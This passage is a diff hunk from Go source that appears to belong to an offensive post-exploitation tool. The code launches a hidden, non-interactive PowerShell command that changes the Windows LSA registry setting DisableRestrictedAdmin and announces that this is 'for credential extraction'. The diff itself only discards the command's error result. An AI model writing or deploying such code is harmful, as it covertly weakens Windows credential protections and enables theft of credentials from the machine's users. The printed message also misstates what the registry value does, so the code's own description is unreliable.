@@ -46,7 +46,7 @@ Write-Output "Previous value: $current"
 	ps2 := `$p="HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"; try { Set-ItemProperty -Path $p -Name "DisableRestrictedAdmin" -Value 0 -Type DWord -Force -ErrorAction Stop; Write-Output "RestrictedAdmin disabled for credential extraction." } catch { }`
 	c2 := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps2)
 	applyHideWindow(c2)
-	c2.Run()
+	_ = c2.Run()
 
 	_ = os.Getpid
 	return result, nil
